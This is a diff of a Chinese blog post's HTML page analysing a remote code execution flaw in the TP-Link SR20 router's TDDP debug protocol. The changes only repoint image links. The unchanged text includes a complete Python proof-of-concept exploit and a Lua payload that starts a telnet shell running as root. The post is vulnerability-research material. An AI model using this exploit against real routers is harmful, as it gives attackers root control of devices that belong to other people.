@@ -17,22 +17,22 @@
 <meta property="og:site_name" content="Ordin">
 <meta property="og:description" content="info">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803172348831.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803172506223.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200803172348831.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200803172506223.png">
 <meta property="og:image" content="https://leave-devour.github.io/images/image-20200803173548905.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803175414831.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803175436714.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092740755.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092832845.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092905412.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092925430.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804092950282.png">
-<meta property="og:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200804093025453.png">
-<meta property="og:updated_time" content="2020-08-04T01:32:49.200Z">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200803175414831.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200803175436714.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200804092740755.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200804092832845.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200804092905412.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200804092925430.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200804092950282.png">
+<meta property="og:image" content="https://leave-devour.github.io/images/image-20200804093025453.png">
+<meta property="og:updated_time" content="2020-08-04T01:39:53.467Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TP Link SR20 ACE漏洞分析">
 <meta name="twitter:description" content="info">
-<meta name="twitter:image" content="https://leave-devour.github.io/2020/08/AppData/Roaming/Typora/typora-user-images/image-20200803172348831.png">
+<meta name="twitter:image" content="https://leave-devour.github.io/images/image-20200803172348831.png">
   
     <link rel="alternative" href="/atom.xml" title="Ordin" type="application/atom+xml">
   
@@ -272,10 +272,10 @@
 
 <p>漏洞的基理为：TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 <code>0x31</code> 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞</p>
 <p>固件下载地址：<a href="https://www.tp-link.com/us/support/download/sr20/#Firmware" target="_blank" rel="noopener">SP20</a></p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803172348831.png" alt="image-20200803172348831"></p>
+<p><img src="/images/image-20200803172348831.png" alt="image-20200803172348831"></p>
 <p>TDDP协议的逆向分析 [Reverse Engineering the TP-Link HS110]([<a href="https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link%20Device%20Debug%20Protocol]" target="_blank" rel="noopener">https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link%20Device%20Debug%20Protocol]</a>(<a href="https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link" target="_blank" rel="noopener">https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/#TP-Link</a> Device Debug Protocol))</p>
 <p><a href="https://www.troopers.de/downloads/troopers17/TR17_fgont_-iot_tp_link_hacking.pdf" target="_blank" rel="noopener">pdf</a></p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803172506223.png" alt="image-20200803172506223"></p>
+<p><img src="/images/image-20200803172506223.png" alt="image-20200803172506223"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个字节是版本号，第二个是类型</span><br></pre></td></tr></table></figure>
 
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>先安装<code>lua</code></p>
@@ -313,20 +313,20 @@
 <p>运行poc</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">61000</span></span><br><span class="line"></span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % <span class="number">00</span></span><br><span class="line"></span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">''</span>, port_receive))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"></span><br><span class="line">response, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = response.encode(<span class="string">'hex'</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>
 
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803175414831.png" alt="image-20200803175414831"></p>
+<p><img src="/images/image-20200803175414831.png" alt="image-20200803175414831"></p>
 <p>然后</p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200803175436714.png" alt="image-20200803175436714"></p>
+<p><img src="/images/image-20200803175436714.png" alt="image-20200803175436714"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>poc的利用链</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_971C() -&gt; sub_936C() -&gt; sub_16418() -&gt; sub_15E74() -&gt; sub_A580() -&gt; sub_91DC()</span><br><span class="line">-&gt; execve(&quot;/bin/sh&quot;, &amp;argv, 0);</span><br></pre></td></tr></table></figure>
 
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092740755.png" alt="image-20200804092740755"></p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092832845.png" alt="image-20200804092832845"></p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092905412.png" alt="image-20200804092905412"></p>
+<p><img src="/images/image-20200804092740755.png" alt="image-20200804092740755"></p>
+<p><img src="/images/image-20200804092832845.png" alt="image-20200804092832845"></p>
+<p><img src="/images/image-20200804092905412.png" alt="image-20200804092905412"></p>
 <p>第二个字节</p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092925430.png" alt="image-20200804092925430"></p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804092950282.png" alt="image-20200804092950282"></p>
+<p><img src="/images/image-20200804092925430.png" alt="image-20200804092925430"></p>
+<p><img src="/images/image-20200804092950282.png" alt="image-20200804092950282"></p>
 <p>从参数上就能看道是通过tftp来执行命令</p>
-<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20200804093025453.png" alt="image-20200804093025453"></p>
+<p><img src="/images/image-20200804093025453.png" alt="image-20200804093025453"></p>
 <p>参考链接</p>
 <p><a href="https://mjg59.dreamwidth.org/51672.html" target="_blank" rel="noopener">挖洞的作者</a></p>
 <p><a href="https://ray-cp.github.io/archivers/tp_link_sr20_ace" target="_blank" rel="noopener">raycp</a></p>
@@ -342,7 +342,7 @@
         <p><span>本文标题:</span><a  href="/2020/08/04/TP-Link-SR20-ACE漏洞分析/">TP Link SR20 ACE漏洞分析</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Ordin 的个人博客">Ordin</a></p>
         <p><span>发布时间:</span>2020年08月04日 - 09时31分</p>
-        <p><span>最后更新:</span>2020年08月04日 - 09时32分</p>
+        <p><span>最后更新:</span>2020年08月04日 - 09时39分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/08/04/TP-Link-SR20-ACE漏洞分析/" title="TP Link SR20 ACE漏洞分析">https://leave-Devour.github.io/2020/08/04/TP-Link-SR20-ACE漏洞分析/</a>
             <span class="copy-path" data-clipboard-text="原文: https://leave-Devour.github.io/2020/08/04/TP-Link-SR20-ACE漏洞分析/　　作者: Ordin" title=""></span>
